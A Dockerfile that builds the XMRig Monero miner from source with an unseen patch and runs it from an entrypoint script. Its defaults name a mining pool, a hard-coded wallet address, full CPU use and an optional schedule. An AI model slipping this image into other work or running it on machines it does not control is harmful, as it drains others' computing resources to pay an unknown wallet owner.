FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v6.3.2'
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15

COPY docker-entrypoint.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/docker-entrypoint.sh

RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero
COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero

# Configuration variables.
ENV POOL_URL=pool.supportxmr.com:5555
ENV POOL_USER=45rfqYG9iNPddvenLpjFskJUhFgqBkdhDeah3X8D8ZJM3KpKqZWCLz3ewLsVd269tZiEyQRV53Ldv2DJb6xeuFokF7SBb1p
ENV POOL_PW=Rancher
ENV COIN=monero
ENV MAX_CPU=100
ENV USE_SCHEDULER=false
ENV START_TIME=2100
ENV STOP_TIME=0600
ENV DAYS=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday

ENTRYPOINT ["docker-entrypoint.sh"]
